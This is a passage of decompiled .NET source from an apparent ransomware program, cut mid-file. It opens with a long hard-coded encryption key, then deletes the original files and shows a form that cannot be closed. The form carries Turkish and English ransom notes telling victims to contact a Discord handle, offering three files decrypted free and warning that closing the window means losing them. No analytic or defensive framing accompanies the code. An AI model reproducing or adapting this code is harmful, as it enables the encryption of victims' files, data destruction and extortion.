n1Nm7FC3IVEsmKdV#qXI09lM2rh87$Vw2WH&7WUpA8Ewyk*o5&yBk7$OoBTo&D$M9pzZDGwg%hI14xvRT2caftl#02R6cFS6D0withlyJreDyDszOC$EA4gOE5*jXzdzxkxDam6LQm0WPiewi0rajn%ItIeXJbBrOnnnOPyBFswvdT84zka6IDpjnPS1hICOlIIB#zI2BQ$zzjeaij&7aEjL7d9*6&2%QIK$k7aACH$0hYsEkrS7kENh76cZ0j5Dw*jr8JYkJ6$@IrDit4wnO#UM#c6n4ji!k!dioBeB@HxnIt8P@3f5VRX2N6w%lKP8XDRpO#@syVUHfgEjDqUBEMG@dK4RmIYS1yyecSa*AVfA6QWg2N24YO4L6XlE8LGq6bopQ8HtpvaRGG%WWXx8o3@M#nhng%8xPXc4Bgy3GIncnmez1YQkvgCchCucz2mTWLbRDbup7#2Goz*QiqvRoXbiV9v*UWcm$3PCLvWyDaM1N5Wqde@JG$E*J!5DOv4k1okUk%Fv3%nOkJ4ZlF4p@@g9yQ!SzskpFBA*tbfg8gojQyWA6fzi1OR7Ik$3dV$ju7JJJ%Fj9wQVn6S9@!uU2bxZsCyJfLDMkFXSpmZaAQJd75TL15aLaKqsiSZgg5dwtdKiIASpbUtL1U!wrnqjk1laweJ&Ws3EMVS3ukD1MTJPZF0Xzcx!n3M21jUdZu@r0p8fb7Cgky6zR%jRmugT#BZriZCky8bzz0xjfuV!aqqx%uK$9cZeOiwyZQ%L5zqLwGAzhAL18nsmsBVwogLvI%LRd*TYxK%JAfaZUTW80*FaYKfx4i%xO#cz#rvipVDXRJMNa$C4sl$j0k!2!4#onH#fcJ5c&nre$qrP&!w8GBFc*29SZ3QU1wjKOgKz89&F@znJ2l$AH$iMb1gjJmMD6&mhghazq69gdAihnyZN*QN5n6IvAAQVv3h5NGCtkErK$CibS*5TW8epsQ@j8NZqPNTJ1m#HWFC37DalwgdBd68wx1l%M!u6NB#RR8jfEX%q%kRpPqV!jYmrn%UAa&44TeP6IS#x%76PaqzNJ5Q$f2WxwlDUnjeG@B&0$UH6v&$L1&R6fHZEQ8Yzqzi%PJKv@zV8T8rxxTII&L6Z3Gogsay3lGjELkQmWirBkSMGxbP%zp@f3SCJ#dc!a!vmYNMNc$UX@$Ok@IRRt2D$mdj!IHSSfyaS58QKxC@44el*d0PuuUhHxzAUdTe$Mbrd45o30g2r8hAh0LxQ066UR23e8$gE67r2vIDHlu3O1YIQZ13!$Xdoe&uCCj459xUByguShQefDr2!tmOgbOii#cXYvBFCz7ODdgzSGKTnS7lVE@RY$w3UPlGvS%5GLcOeDyXmV$a0##y%zCU@spGcE3W1aEAjONCpSgSneEc9WczUVj$pkCW$5laic%MR4zlQ1JmsSGxOmgPbDCFZIs*MZgTgGJLh1Ue5ZJ2M%L6emhrY5*fA0Vik19ZUYGmJ4Qv1bTk@i!@%v38Rx4kHdkpfl@dZShwZ*wJ%UZWlwl0*!lx7ah53$FFTAQPIPtjaeD7*Tc%7H*T0sRmAefykL@#2Ry5EKO%cbZ3YNZN&k7v%unArdoDJ#8YLIep#G!w2CQY2wwVn1!9Ng&HdYNa4kvhcBrpiJszSK3#Exg#P@YRC9kEk&le21!qPiv1FHmehBpDMDDorStbVeFcZNFL6O7zRln$boYhptJBSh1H36Vjgz4kDTb0bbH@cYUaxhmD@lub4EsRV7qA!wT0QD1RN7GnMp73vzrVTSQ#F@P8AsFdTgaoF3sUP4Y$fgxOfy44o4PigYVww2q3!C#FPSX2g6fx3Ux7EB@KXjxx00IPh5&WN4cdMS*vBCXRx0ouawSV9gfrNFnXKIUk9Sk*rtuUCGiVVG99LvoTmkWGYtZHEKl2QMrfpQDPb&T27s%gFOlw2a&x$eJ7#nQ13PFiX3s4S8ro0#hFwsCy7X9Po3jkgFuwQ!8rnWrk4qe3rr6B%djklz@FPY3#TIwNm#**4y0aaz4psf6%%InD$jkZ*@Cx@wzv@zpws7GgMJjU$muj167k3trDsIABwCgM9IW2Yim7CHZuAy#uh1%5Yo2iImEk7esjC6UWy2USTAiV3%c@NO@$FKwToNtLeb96XpscEH$OgNlYGGOLjk6SLwE0JaHLIinRAl7NmAxGsOx1*7Ni8Ib3EQuAL!2D9sG&9#x3IB*JVz8%8M2LW*M9HtmsZ&CtHUGAhz1EiTa7J1HNqxB*9qpBGGZoQFDK*NCaT8xItXCc7OZPM9bb%DUZEF@bAMWdpy85YG@rA2NkOmD1pKCqdbN4!l%nFvhhB7vho#ZGfSBdyjkzCbuyjf9nLdDmjoMNUFJQz4lVt5ktAjFraFlDaR7$*I5kzM5zfwSTa#Agy9FN#oNb*tMecJMcHnrR8a4HAtnl0uRGeeNBMTaS#3MfA0w%kplVlrhxe&NjaBKmcf97$LyWm8wewxHI%qBKi$#v6Y5oGzr2s9D30yB9ZxIm4capyFmSA9EHLmBGoKQvp#uXuNQgpbtTvq13XPYam82s$$RNX4TohV%AQM4lXGc*oTt#ugr8uPiqbb!y$cruqelAt0MkUMMg5#EkKW!qMt31mO*OTeQUwqQjhtJ#3gniDbUg&qOhKaI%KtWF2&zP50SON3DZm&WFGUXk30qcZIKvIT8w&Eb5P7MlSG@DnX#MNDZy5LLBpXywQ5f@#o2i50Yhhl!w7NxbN&iF@J0u!AP0hY$vA9I*$upVNRqTsXDC9XJSWa9UXHQ$L79SQfW7eyf!Qv0k1gCE6m1Tol98AwjXEUKPR*Dmae6jRqbAiX2Qel*7fPDEGX7qoRw5lL2@dxd1pRC7K8ZL#@S1vMJC$8gMgP#93FX&$9mpIGRXNe3g&VvV8$J8bz&eqztAWCdek!p4PcsP4UxZeAOU2ha75x$ECI*RuqBkBY$Ff1f5l@EQbg9ql9HOBFIv%L2HEB#mTmYPEiOBbeVCTOC4iQFujVJ$piI#8*1K8z6xRsMcUfm%sGCRi&*W5ID&D38$ATCcmLc@RNmYECadimLjgzUBAEOzw8UwtqCaDjshDi94tiS@h8xZRYxJ8BcI6lFS2YeW99A*@dg&zypzUUrxj#f4!2bCHKkzDQC$E5@h*y6NrzritLwL@QI*SJ#g770S2P#jwUvx1KyT&1MbK2R$W86vIDl4bvja7nUC%IU8x*TSzXB0625eP5$@rhbti1WFAYusgjeC", "M6yaS6B&");
				FileSystem.Kill(fileInfo3.FullName);
				if (fullName3.Contains("zeranine.exe"))
				{
					FileSystem.Kill(fullName3 + ".zeronine");
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		dil.set_SelectedItem((object)"Türkçe");
		((Control)this).set_Height(300);
		((Control)coz).set_Top(checked(((Control)this).get_Height() - 90));
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.sifrecoz).Show();
	}

	private void Form1_Closing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(dil.get_SelectedItem(), (object)"Türkçe", false))
		{
			yazi1.set_Text("Dosyaların şifrelendi! Şifreyi çözmek için iletişim:\r\nDiscord--->umutcankurhan#9743\r\nÜcretsiz olarak 3 dosyanı kurtarabilirsin.\r\n");
			uyari.set_Text("Bunu kapatırsan dosyalarını kurtaramazsın!");
			((ButtonBase)MyProject.Forms.sifrecoz.ucretsizcoz).set_Text("Ücretsiz Çöz (" + Conversions.ToString(sayi) + ")");
			((ButtonBase)MyProject.Forms.sifrecoz.coz).set_Text("Tamamını Çöz");
			((ButtonBase)coz).set_Text("Şifreyi Çöz");
			((ButtonBase)MyProject.Forms.key.unlck).set_Text("Unlock");
			MyProject.Forms.key.yazi1.set_Text("Key");
			MyProject.Forms.key.yazi1.set_Text("Kilidi Aç");
		}
		else if (Operators.ConditionalCompareObjectEqual(dil.get_SelectedItem(), (object)"English", false))
		{
			((ButtonBase)coz).set_Text("Decrypt");
			((ButtonBase)MyProject.Forms.sifrecoz.ucretsizcoz).set_Text("Decrypt for free (" + Conversions.ToString(sayi) + ")");
			((ButtonBase)MyProject.Forms.sifrecoz.coz).set_Text("Decrypt all files");
			yazi1.set_Text("Your files are encrypted! To decrypt them, contact:\r\nDiscord--->umutcankurhan#9743\r\nYou can save 3 of your files for free.");
			uyari.set_Text("If you close this, you won't be able to decrypt\r\nyour files!");
			((ButtonBase)MyProject.Forms.sifrecoz.kilit).set_Text("Unlock");
			((ButtonBase)MyProject.Forms.key.unlck).set_Text("Unlock");
			MyProject.Forms.key.yazi1.set_Text("Unlock");
		}
	}
}
